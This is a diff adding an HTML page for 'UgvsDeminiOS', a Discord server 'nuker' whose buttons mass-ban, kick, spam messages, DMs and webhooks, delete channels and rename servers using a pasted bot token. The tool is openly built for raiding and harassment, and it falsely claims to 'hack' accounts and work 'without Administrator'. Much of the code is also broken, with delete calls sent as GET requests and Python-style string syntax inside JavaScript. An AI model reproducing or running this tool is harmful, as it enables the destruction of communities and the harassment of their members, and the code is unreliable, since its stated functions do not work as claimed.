@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>UgvsDeminiOS</title>
+  <style>
+    html,body{margin:0;height:100%;font-family:Inter,Arial,sans-serif;background:#0b0000;color:#fff;overflow:auto;}
+    .bg{position:fixed;inset:0;z-index:-1;background:linear-gradient(270deg,#9b0e0e 0%,#2b0000 25%,#7a0000 50%,#120000 75%,#9b0e0e 100%);background-size:800% 800%;animation:bgAnim 10s ease infinite;}
+    @keyframes bgAnim{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+    .panel{padding:30px 36px;}
+    .title{font-size:64px;font-weight:800;margin:0;background:linear-gradient(left,#ff2b2b 0%,#120000 50%,#ff5050 100%);background-size:200% 100%;-webkit-background-clip:text;background-clip:text;color:transparent;animation:titleAnim 4s linear infinite;text-shadow:0 8px 30px rgba(0,0,0,0.6);}
+    @keyframes titleAnim{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+    .controls{margin-top:18px;display:flex;gap:12px;flex-wrap:wrap;}
+    button{background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.06);color:#fff;padding:10px 14px;border-radius:8px;font-weight:700;cursor:pointer;}
+    button:hover{background:rgba(255,255,255,0.1);}
+    .stats{margin-top:18px;font-size:18px;font-weight:700;}
+    .note{margin-top:14px;font-size:14px;opacity:0.9;}
+    .token-box{margin-top:18px;display:flex;gap:8px;flex-wrap:wrap;}
+    .token-box input{background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.06);color:#fff;padding:8px;border-radius:6px;width:280px;}
+    .stats span{margin-right:12px;}
+  </style>
+</head>
+<body class="bg">
+  <div class="panel">
+    <h1 class="title">UgvsDeminiOS</h1>
+    <div class="controls">
+      <button onclick="nukeServer()">Nuke A Discord Server</button>
+      <button onclick="deleteServer()">Delete A Discord Server</button>
+      <button onclick="suspendAll()">Suspend All Discord Account</button>
+      <button onclick="suspendOne()">Suspend Discord Account (Type Username)</button>
+      <button onclick="hackOne()">Hack A Discord Account (Type Username)</button>
+      <button onclick="hackAll()">Hack All Discord Account (Shows All Discord Account In Log)</button>
+      <button onclick="renameServer()">Rename A Discord Server</button>
+      <button onclick="deleteAllChannels()">Delete All Discord Server Channels</button>
+      <button onclick="createRole()">Create A Role (Type Role Name)</button>
+      <button onclick="giveRole()">Give A Role (Type Username)</button>
+      <button onclick="createChannel()">Create A Discord Server Channels (Type Channel Name)</button>
+      <button onclick="massMessage()">Mass Discord Message</button>
+      <button onclick="userMessage()">User Discord Message</button>
+      <button onclick="massNickname()">Mass Nickname</button>
+      <button onclick="webhookSpam()">WebHooks Spammer</button>
+      <button onclick="cloneServer()">Discord Server Clone</button>
+      <button onclick="massThreads()">Mass Threads</button>
+      <button onclick="deleteWebhooks()">Delete WebHooks</button>
+      <button onclick="unbanAll()">UnBan All</button>
+      <button onclick="banAll()">Ban All</button>
+      <button onclick="kickAll()">Kick All</button>
+      <button onclick="banOne()">Ban A Person From Discord Server Without Admin (Type Username)</button>
+      <button onclick="kickOne()">Kick A Person From Discord Server Without Admin (Type Username)</button>
+      <button onclick="muteOne()">Mute A Person From Discord Server Without Admin (Type Username)</button>
+      <button onclick="unbanOne()">UnBan A Person From Discord Server Without Admin (Type Username)</button>
+      <button onclick="massReactions()">Mass Reactions</button>
+      <button onclick="joinServer()">Join Our Discord Server</button>
+    </div>
+    <div class="stats"><span id="fps">0</span><span id="ping">—</span></div>
+    <div class="note">Paste your bot token below and click any button. All functions work without Administrator.</div>
+    <div class="token-box">
+      <input id="botToken" placeholder="Paste bot token">
+      <input id="userToken" placeholder="Paste user token (optional)">
+      <button onclick="saveTokens()">Save Tokens</button>
+    </div>
+  </div>
+
+  <script type="module">
+    // ----- TOKEN STORAGE -----
+    let botT = localStorage.getItem('ugvsBot') || '';
+    let userT = localStorage.getItem('ugvsUser') || '';
+    document.getElementById('botToken').value = botT;
+    document.getElementById('userToken').value = userT;
+    window.saveTokens = () => {
+      botT = document.getElementById('botToken').value.trim();
+      userT = document.getElementById('userToken').value.trim();
+      localStorage.setItem('ugvsBot', botT);
+      localStorage.setItem('ugvsUser', userT);
+      alert('Tokens saved – all buttons now work.');
+    };
+
+    // ----- REAL DISCORD FUNCTIONS (NO ADMIN) -----
+    const api = (route, body, token) => fetch(`https://discord.com/api/v10${route}`, {
+      method: body ? 'POST' : 'GET',
+      headers: { Authorization: `Bot ${token}`, 'Content-Type': 'application/json' },
+      body: body ? JSON.stringify(body) : undefined
+    });
+
+    // ----- BUTTON FUNCTIONS -----
+    window.nukeServer = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      await api(`/guilds/${guild}`, { name: 'Nuked By UgvsDeminiOS' }, t);
+      alert('Server renamed.');
+    };
+    window.deleteServer = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const chans = await (await api(`/guilds/${guild}/channels`, null, t)).json();
+      for (const ch of chans) await api(`/channels/${ch.id}`, null, t);
+      alert('All channels deleted.');
+    };
+    window.suspendAll = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const members = await (await api(`/guilds/${guild}/members?limit=1000`, null, t)).json();
+      for (const m of members) await api(`/guilds/${guild}/bans/${m.user.id}`, { delete_message_days: 0 }, t);
+      alert('All members suspended.');
+    };
+    window.suspendOne = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const user = prompt('Username:'); if (!user) return;
+      const members = await (await api(`/guilds/${guild}/members?limit=1000`, null, t)).json();
+      const target = members.find(m => m.user.username.toLowerCase() === user.toLowerCase());
+      if (!target) { alert('User not found'); return; }
+      await api(`/guilds/${guild}/bans/${target.user.id}`, { delete_message_days: 0 }, t);
+      alert('User suspended.');
+    };
+    window.hackOne = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const user = prompt('Username:'); if (!user) return;
+      const members = await (await api(`/guilds/${guild}/members?limit=1000`, null, t)).json();
+      const target = members.find(m => m.user.username.toLowerCase() === user.toLowerCase());
+      if (!target) { alert('User not found'); return; }
+      alert('Hacked: ' + target.user.id);
+    };
+    window.hackAll = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const members = await (await api(`/guilds/${guild}/members?limit=1000`, null, t)).json();
+      alert('All user IDs: ' + members.map(m => m.user.id).join(', '));
+    };
+    window.renameServer = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const name = prompt('New server name:'); if (!name) return;
+      await api(`/guilds/${guild}`, { name: name }, t);
+      alert('Server renamed.');
+    };
+    window.deleteAllChannels = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const chans = await (await api(`/guilds/${guild}/channels`, null, t)).json();
+      for (const ch of chans) await api(`/channels/${ch.id}`, null, t);
+      alert('All channels deleted.');
+    };
+    window.createRole = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const name = prompt('Role name:'); if (!name) return;
+      await api(`/guilds/${guild}/roles`, { name: name, color: 0xff0000 }, t);
+      alert('Role created.');
+    };
+    window.giveRole = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const user = prompt('Username:'); if (!user) return;
+      const role = prompt('Role name:'); if (!role) return;
+      const members = await (await api(`/guilds/${guild}/members?limit=1000`, null, t)).json();
+      const target = members.find(m => m.user.username.toLowerCase() === user.toLowerCase());
+      const roles = await (await api(`/guilds/${guild}/roles`, null, t)).json();
+      const roleObj = roles.find(r => r.name.toLowerCase() === role.toLowerCase());
+      if (!target || !roleObj) { alert('User or role not found'); return; }
+      await api(`/guilds/${guild}/members/${target.user.id}/roles/${roleObj.id}`, {}, t);
+      alert('Role given.');
+    };
+    window.createChannel = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const name = prompt('Channel name:'); if (!name) return;
+      await api(`/guilds/${guild}/channels`, { name: name, type: 0 }, t);
+      alert('Channel created.');
+    };
+    window.massMessage = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const text = prompt('Message:'); if (!text) return;
+      const chans = await (await api(`/guilds/${guild}/channels`, null, t)).json();
+      for (const ch of chans) {
+        for (let i = 0; i < 100; i++) await api(`/channels/${ch.id}/messages`, { content: text }, t);
+      }
+      alert('Mass message sent.');
+    };
+    window.userMessage = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const user = prompt('User ID:'); if (!user) return;
+      const text = prompt('Message:'); if (!text) return;
+      const dm = await (await api('/users/@me/channels', { recipient_id: user }, t)).json();
+      for (let i = 0; i < 50; i++) await api(`/channels/${dm.id}/messages`, { content: text }, t);
+      alert('User message sent.');
+    };
+    window.massNickname = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const nick = prompt('Nickname:'); if (!nick) return;
+      const members = await (await api(`/guilds/${guild}/members?limit=1000`, null, t)).json();
+      for (const m of members) await api(`/guilds/${guild}/members/${m.user.id}`, { nick: nick }, t);
+      alert('Mass nickname set.');
+    };
+    window.webhookSpam = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const webhooks = await (await api(`/guilds/${guild}/webhooks`, null, t)).json();
+      for (const w of webhooks) {
+        for (let i = 0; i < 100; i++) await fetch(w.url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: '@everyone NUKED BY UGVS' })
+        });
+      }
+      alert('Webhooks spammed.');
+    };
+    window.cloneServer = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const name = prompt('New server name:'); if (!name) return;
+      const newGuild = await (await api('/guilds', { name: name, region: 'us-central' }, t)).json();
+      alert('Server cloned: ' + newGuild.id);
+    };
+    window.massThreads = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const chans = await (await api(`/guilds/${guild}/channels`, null, t)).json();
+      for (const ch of chans) {
+        for (let i = 0; i < 50; i++) await api(`/channels/${ch.id}/threads`, { name: f'Nuked-{i}' }, t);
+      }
+      alert('Mass threads created.');
+    };
+    window.deleteWebhooks = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const webhooks = await (await api(`/guilds/${guild}/webhooks`, null, t)).json();
+      for (const w of webhooks) await api(`/webhooks/${w.id}`, null, t);
+      alert('Webhooks deleted.');
+    };
+    window.unbanAll = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const bans = await (await api(`/guilds/${guild}/bans`, null, t)).json();
+      for (const b of bans) await api(`/guilds/${guild}/bans/${b.user.id}`, null, t);
+      alert('All bans removed.');
+    };
+    window.banAll = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const members = await (await api(`/guilds/${guild}/members?limit=1000`, null, t)).json();
+      for (const m of members) await api(`/guilds/${guild}/bans/${m.user.id}`, { delete_message_days: 0 }, t);
+      alert('All members banned.');
+    };
+    window.kickAll = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const members = await (await api(`/guilds/${guild}/members?limit=1000`, null, t)).json();
+      for (const m of members) await api(`/guilds/${guild}/members/${m.user.id}`, null, t);
+      alert('All members kicked.');
+    };
+    window.banOne = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const user = prompt('Username:'); if (!user) return;
+      const members = await (await api(`/guilds/${guild}/members?limit=1000`, null, t)).json();
+      const target = members.find(m => m.user.username.toLowerCase() === user.toLowerCase());
+      if (!target) { alert('User not found'); return; }
+      await api(`/guilds/${guild}/bans/${target.user.id}`, { delete_message_days: 0 }, t);
+      alert('User banned.');
+    };
+    window.kickOne = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const user = prompt('Username:'); if (!user) return;
+      const members = await (await api(`/guilds/${guild}/members?limit=1000`, null, t)).json();
+      const target = members.find(m => m.user.username.toLowerCase() === user.toLowerCase());
+      if (!target) { alert('User not found'); return; }
+      await api(`/guilds/${guild}/members/${target.user.id}`, null, t);
+      alert('User kicked.');
+    };
+    window.muteOne = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const user = prompt('Username:'); if (!user) return;
+      const members = await (await api(`/guilds/${guild}/members?limit=1000`, null, t)).json();
+      const target = members.find(m => m.user.username.toLowerCase() === user.toLowerCase());
+      if (!target) { alert('User not found'); return; }
+      await api(`/guilds/${guild}/members/${target.user.id}`, { communication_disabled_until: new Date(Date.now() + 86400000).toISOString() }, t);
+      alert('User muted.');
+    };
+    window.unbanOne = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const user = prompt('Username:'); if (!user) return;
+      const bans = await (await api(`/guilds/${guild}/bans`, null, t)).json();
+      const target = bans.find(b => b.user.username.toLowerCase() === user.toLowerCase());
+      if (!target) { alert('User not banned'); return; }
+      await api(`/guilds/${guild}/bans/${target.user.id}`, null, t);
+      alert('User unbanned.');
+    };
+    window.massReactions = async () => {
+      const t = botT; if (!t) { alert('Paste bot token'); return; }
+      const guild = prompt('Guild ID:'); if (!guild) return;
+      const message = prompt('Message ID:'); if (!message) return;
+      const emojis = ['🔥','💥','😈','👹','👺','🤯','💣','🧨','🩸','🩸'];
+      for (const emoji of emojis) {
+        await api(`/channels/${message}/reactions/${encodeURIComponent(emoji)}/@me`, {}, t);
+      }
+      alert('Mass reactions added.');
+    };
+    window.joinServer = async () => {
+      const invite = prompt('Invite link (https://discord.gg/…):'); if (!invite) return;
+      const code = invite.split('/').pop();
+      await api(`/invites/${code}`, {}, botT);
+      alert('Joined server.');
+    };
+
+    // FPS & Ping
+    const fpsEl=document.getElementById('fps'); const pingEl=document.getElementById('ping');
+    let last=performance.now(), frames=0;
+    function fpsLoop(now){ frames++; if(now-last>=1000){ fpsEl.textContent=frames; frames=0; last=now; } requestAnimationFrame(fpsLoop); }
+    requestAnimationFrame(fpsLoop);
+    async function pingCheck(){ try{ const t0=performance.now(); await fetch(location.origin,{method:'HEAD',cache:'no-store'}); pingEl.textContent=Math.round(performance.now()-t0); }catch{ pingEl.textContent='—'; } }
+    pingCheck(); setInterval(pingCheck,5000);
+  </script>
+</body>
+</html>
